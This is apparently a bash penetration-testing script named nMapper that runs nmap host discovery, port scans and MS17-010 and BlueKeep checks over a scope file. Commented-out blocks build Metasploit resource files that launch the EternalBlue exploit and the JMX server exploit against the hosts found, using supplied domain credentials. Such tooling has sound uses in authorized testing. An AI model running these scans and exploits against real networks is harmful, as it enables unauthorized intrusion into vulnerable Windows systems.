#!/usr/bin/bash

bold=$(tput bold)
white=$(tput setaf 7)
red=$(tput setaf 9)
normal=$(tput sgr0)
green=$(tput setaf 2)
blue=$(tput setaf 4)

b_green=$(tput setab 2)
b_red=$(tput setab 9)


echo "${green}${bold}  
      ::::    :::  :::   :::      :::    ::::::::: ::::::::: ::::::::::::::::::: 
     :+:+:   :+: :+:+: :+:+:   :+: :+:  :+:    :+::+:    :+::+:       :+:    :+: 
    :+:+:+  +:++:+ +:+:+ +:+ +:+   +:+ +:+    +:++:+    +:++:+       +:+    +:+ 
   +#+ +:+ +#++#+  +:+  +#++#++:++#++:+#++:++#+ +#++:++#+ +#++:++#  +#++:++#:    
  +#+  +#+#+#+#+       +#++#+     +#++#+       +#+       +#+       +#+    +#+    
 #+#   #+#+##+#       #+##+#     #+##+#       #+#       #+#       #+#    #+#     
###    #######       ######     ######       ###       #############    ### ${normal}";     


echo "${white}${bold}
            Version    : 1.0
            Author     : Orhan YILDIRIM
            Medium     : @orhan_yildirim
            Linkedin   : www.linkedin.com/in/orhan-yildirim
            License    : MIT License
            Note       : Who's up!

${normal}";

while getopts u:p:d: flag
	do
	    case "${flag}" in
	        u) username=${OPTARG};;
	        p) password=${OPTARG};;
	        d) domain=${OPTARG};;
	    esac
	done

	echo "${red}${bold}Notes: ${normal}"
    echo "${white}${bold}[1] For scanning process you have to set 'scope.txt' on same folder.${normal}$domain";
    echo "${white}${bold}[2] For privileged user you have to specify an account '-u username -p password -d domain'${normal}$domain";
	echo "${white}${bold}[3] Example Usage: ./nmapper.sh -u <username> -p <password> -d <domain>'${normal}$domain";
    echo -en "\n"
	echo "${green}${bold}[+] Username: ${normal}$username";
	echo "${green}${bold}[+] Password: ${normal}$password";
	echo "${green}${bold}[+] Domain: ${normal}$domain";
	echo -en '\n'


#======================================================================================================================

#nMapper Starting
echo "${green}${bold}[+] nMapper is started...${normal}"
echo "${green}${bold}[+] Creating 'result' Directory...${normal}"
rm nohup* 2> stderrfile ;
nohup mkdir results 2> stderrfile;
rm nohup*

#======================================================================================================================

#MSFCONSOLE
nohup msfdb stop 2> stderrfile ;
nohup msfdb start 2> stderrfile ;
nohup msfdb init 2> stderrfile ;
#======================================================================================================================

#HOST DISCOVERY=================================================================================
#Ping Scan
SECONDS=0
duration=$SECONDS
echo "${green}${bold}[+] Host discovery process is started (Ping Scanning)${normal}"
nohup nmap -n -sP -T5 -iL scope.txt --min-hostgroup 1000 --min-parallelism 1000 --max-retries 2 --stats-every 30s -oG - | grep "Status: Up" | cut -d " " -f 2 > results/raw_up_hosts.txt 2> stderrfile ;
echo "${white}${bold}[+] Finished Host Discovery Process! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.${normal}"


#======================================================================================================================

#FIND PORT 445 
SECONDS=0
echo "${green}${bold}[+] Started scanning port : 445${normal}"
nohup nmap -iL results/raw_up_hosts.txt -n -Pn -p445 --open --stats-every 30s -oG - | grep "Status: Up" | cut -d  " " -f 2 > results/445.txt  2> stderrfile;
duration=$SECONDS
echo "${bold}[+] Finished scanned port 445! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.${normal}"
#======================================================================================================================

#MS17-010 Vulnerability
SECONDS=0
echo "${green}${bold}[+] Scanning MS17-010 Vulnerability ${normal}"
nohup nmap -n -Pn -iL results/445.txt  --script smb-vuln-ms17-010.nse --stats-every 30s -p445 -oN results/ms17-010_vulnerability.txt 2> stderrfile ;
rm nohup*
cat results/ms17-010_vulnerability.txt | grep -B 12 '''SMBv1 servers (ms17-010)''' | grep 'for' | awk '{print $5}' > results/ms17_010.txt
echo "" | while read line;do echo "${white}${b_red}${bold}[!] FOUND MS17-010 VULNERABILITY${normal}" ; echo -en "\n" ;cat results/ms17_010.txt; echo -ne "\n" ;done;
echo "${while}${bold}${b_red}[+] MS17-010 scanned! ${normal}";

duration=$SECONDS
echo "${white}${bold}[+] Finished MS17-010 Vulnerability Script! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.${normal})"

#======================================================================================================================
#Exploit auxiliary/admin/smb/ms17_010_command

#msfconsole -q ; workspace -a $domain ; workspace $domain
# if cat ./results/ms17_010.txt  2> stderrfile | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'  2> stderrfile;
# then
	# echo "$(tput setaf 4)$(tput bold)[+] Launching MS17-010 Metasploit$(tput sgr 0)"
	# mate-terminal -- bash -c '
	# touch results/ms17_010_command.rc ;
	# echo use auxiliary/admin/smb/ms17_010_command > results/ms17_010_command.rc  ;
	# echo set COMMAND ipconfig >> results/ms17_010_command.rc ;
	# echo set SMBPASS '$password' >> results/ms17_010_command.rc ;
	# echo set SMBUSER '$username' >> results/ms17_010_command.rc ;
	# echo set SMBDOMAIN '$domain' >> results/ms17_010_command.rc ;
	# echo set RHOSTS file:./results/ms17_010.txt >> results/ms17_010_command.rc ;
	# echo spool results/ms17_010_command_executed >> results/ms17_010_command.rc ;
	# echo exploit -j >> results/ms17_010_command.rc ;
	# msfconsole -q -r results/ms17_010_command.rc '&
	# echo "$(tput setaf 4)$(tput bold)[+] Launched MS17-010 Metasploit in another terminal$(tput sgr 0)";
# fi

#Exploit exploit/windows/smb/ms17_010_eternalblue

# if cat ./results/ms17_010.txt  2> stderrfile | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'  2> stderrfile;
# then
	# echo "${b_red}${white}${bold}[+] Launching MS17-010 Metasploit${normal}"
	# mate-terminal -- bash -c '
	# touch results/ms17_010_eternalblue.rc ;
	# echo use exploit/windows/smb/ms17_010_eternalblue > results/ms17_010_eternalblue.rc  ;
	# echo set COMMAND ipconfig >> results/ms17_010_eternalblue.rc ;
	# echo set SMBPASS '$password' >> results/ms17_010_eternalblue.rc ;
	# echo set SMBUSER '$username' >> results/ms17_010_eternalblue.rc ;
	# echo set SMBDOMAIN '$domain' >> results/ms17_010_eternalblue.rc ;
	# echo set RHOSTS file:./results/ms17_010.txt >> results/ms17_010_eternalblue.rc ;
	# echo spool results/ms17_010_command_executed >> results/ms17_010_eternalblue.rc ;
	# echo exploit -j >> results/ms17_010_eternalblue.rc ;
	# msfconsole -q -r results/ms17_010_eternalblue.rc '&
	# echo "${b_red}${bold}${white}[+] Launched MS17-010 Metasploit in another terminal${white}";
# fi

#======================================================================================================================
# #MS08-067 Vulnerability
# SECONDS=0
# echo "${green}${bold}[+] Scanning MS08-067 Vulnerability ${normal}"
# nohup nmap -n -Pn -iL results/445.txt  --script smb-vuln-ms08-067.nse --stats-every 30s -p445 -oN results/ms08-067_vulnerability 2> stderrfile ;
# rm nohup*
# cat results/ms08-067_vulnerability | grep -B 12 '''ms08-067)''' | grep 'for' | awk '{print $5}' > results/ms08_067.txt
# echo "" | while read line;do echo "${b_red}${bold}${white}[!] FOUND MS08-067 VULNERABILITY:  ${normal}" ;echo -en "\n" ;cat results/ms08_067.txt; echo -en "\n" ;done ; echo "${b_red}${white}${bold}[+] SMB VULNERABILITY SCRIPT is done! ${normal}";
# duration=$SECONDS
# echo "${white}${bold}[+] Finished MS08-067 Vulnerability Script! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.${normal}"


#======================================================================================================================
#Bluekeep Check 
#Only checks Blukeep not port scanning 3389!
echo "$(tput setaf 4)$(tput bold)[+] Checking Bluekeep Vulnerability...$(tput sgr 0)"
nohup nmap -n -Pn -iL results/445.txt  --stats-every 30s -p3389 -oG - | grep "Status: Up" | cut -d " " -f 2 > results/3389.txt 2> stderrfile ;
# if cat ./results/3389.txt | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' 2> stderrfile;
# then
	# echo "${blue}${bold}[+] Launching Bluekeep Vulnerability Check!${normal}"
	# mate-terminal -- bash -c '
	# touch ./results/bluekeep_check.rc ;
	# echo use auxiliary/scanner/rdp/cve_2019_0708_bluekeep > ./results/bluekeep_check.rc  ;
	# echo set RDP_CLIENT_IP '0.0.0.0' >> ./results/bluekeep_check.rc ;
	# echo set RHOSTS file:./results/3389.txt >> ./results/bluekeep_check.rc ;
	# echo spool ./results/raw_bluekeep >> ./results/bluekeep_check.rc ;
	# echo run >> ./results/bluekeep_check.rc ;
	# echo exit -y >> ./results/bluekeep_check.rc ;
	# msfconsole -q -r ./results/bluekeep_check.rc '
	# echo "${blue}${bold}[+] Launched Bluekeep Checking Metasploit in another terminal${normal}";
	# echo "${white}${bold}[+] Bluekeep Vulnerability scanned!${normal}";
# fi


#======================================================================================================================


#Port Scanning Process
SECONDS=0
echo "${green}${bold}[+] Started scanning ports....${normal}"
nohup nmap -n -Pn -p21,22,23,25,53,80,111,137,139,443,1099,1433,1521,3306,5060,5432,27017,8080,8081,161,623 --open -iL results/raw_up_hosts.txt --min-hostgroup 1000 --min-parallelism 1000 --max-retries 3 -oG results/raw_port_scan 2> stderrfile;
cat results/raw_port_scan | grep "443/open" | cut -d " " -f 2 > results/443.txt;
cat results/raw_port_scan | grep "80/open" | cut -d " " -f 2 > results/80.txt;
cat results/raw_port_scan | grep "21/open" | cut -d " " -f 2 > results/21.txt;
cat results/raw_port_scan | grep "22/open" | cut -d " " -f 2 > results/22.txt;
cat results/raw_port_scan | grep "23/open" | cut -d " " -f 2 > results/23.txt;
cat results/raw_port_scan | grep "25/open" | cut -d " " -f 2 > results/25.txt;
cat results/raw_port_scan | grep "53/open" | cut -d " " -f 2 > results/53.txt;
cat results/raw_port_scan | grep "111/open" | cut -d " " -f 2 > results/111.txt; 
cat results/raw_port_scan | grep "137/open" | cut -d " " -f 2 > results/137.txt;
cat results/raw_port_scan | grep "139/open" | cut -d " " -f 2 > results/139.txt;
cat results/raw_port_scan | grep "1099/open" | cut -d " " -f 2 > results/1099.txt; 
cat results/raw_port_scan | grep "1433/open" | cut -d " " -f 2 > results/1433.txt;
cat results/raw_port_scan | grep "1521/open" | cut -d " " -f 2 > results/1521.txt;
cat results/raw_port_scan | grep "3306/open" | cut -d " " -f 2 > results/3306.txt;
#cat results/raw_port_scan | grep "3389/open" | cut -d " " -f 2 > results/3389.txt;
cat results/raw_port_scan | grep "5432/open" | cut -d " " -f 2 > results/5432.txt;
cat results/raw_port_scan | grep "161/open" | cut -d " " -f 2 > results/161.txt;
cat results/raw_port_scan | grep "623/open" | cut -d " " -f 2 > results/623.txt;
cat results/raw_port_scan | grep "5060/open" | cut -d " " -f 2 > results/5060.txt; 
cat results/raw_port_scan | grep "5432/open" | cut -d " " -f 2 > results/5432.txt; 
cat results/raw_port_scan | grep "27017/open" | cut -d " " -f 2 > results/27017.txt;  
duration=$SECONDS
echo "${white}${bold}[+] Finished port scanning! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.${normal}"


#======================================================================================================================
#Java JMX Agent Insecure Configuration
#Port 1099
#exploit(multi/misc/java_jmx_server)
# if cat ./results/1099.txt 2> stderrfile | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'  2> stderrfile;
# then
	# echo "$(tput setaf 4)$(tput bold)[+] Launching JMX Agent Insecure Configuration Vulnerability Check!$(tput sgr 0)"
	# mate-terminal -- bash -c '
	# touch ./results/jmx_agent_insecure_check.rc ;
	# echo use exploit/multi/misc/java_jmx_server > ./results/jmx_agent_insecure_check.rc  ;
	# echo set RDP_CLIENT_IP '0.0.0.0' >> ./results/bluekeep_check.rc ;
	# echo set RHOSTS file:./results/1099.txt  >> ./results/jmx_agent_insecure_check.rc ;
	# echo spool ./results/jmx_agent_insecure_check >> ./results/jmx_agent_insecure_check.rc ;
	# echo run >> ./results/jmx_agent_insecure_check.rc ;
	# echo exit -y >> ./results/jmx_agent_insecure_check.rc ;
	# msfconsole -q -r ./results/jmx_agent_insecure_check.rc '
	# echo "${blue}${bold}[+] Launched JMX Agent Insecure Configuration Metasploit in another terminal${normal}";
	# echo ""| while read line;do echo "${bold}${white}[!] LISTING JMX Agent Insecure Configuratio VULNERABILITY:  $(tput sgr 0)" ;echo -ne "\n";cat jmx_agent_insecure_check ; echo -en "\n";done ; echo "${white}${bold}[+] JMX Agent Insecure Configuratio scan is done! ${normal}";
# fi
#======================================================================================================================



# echo "${green}${bold}[+] SMB Share Unprivileged User ${normal}"
# echo "${green}${bold}[+] SMB Share Privileged User ${normal}"
# echo "${green}${bold}[+] SMB Signing False ${normal}"
# echo "${green}${bold}[+] NFS Share ${normal}"

# echo "${green}${bold}[+] MSSQL Scanning ${normal}"
# echo "${green}${bold}[+] IPMI  ${normal}"
# echo "${green}${bold}[+] SMTP Open Relay ${normal}"
# echo "${green}${bold}[+] ORACLE sid brute force attack ${normal}"
# echo "${green}${bold}[+] Telnet Usage ${normal}"
# echo "${green}${bold}[+] MySQL is progressing ${normal}"
# echo "${green}${bold}[+] Anonymous FTP ${normal}"
# echo "${green}${bold}[+] DNS Cache Snooping ${normal}"


# echo "${green}${bold}[+]  ${normal}"
# echo "${green}${bold}[+]  ${normal}"
# echo "${green}${bold}[+]  ${normal}"
# echo "${green}${bold}[+]  ${normal}"
# echo "${green}${bold}[+]  ${normal}"
# echo "${green}${bold}[+]  ${normal}"
# echo "${green}${bold}[+]  ${normal}"
# echo "${green}${bold}[+]  ${normal}"
# echo "${green}${bold}[+]  ${normal}"
# echo "${green}${bold}[+]  ${normal}"
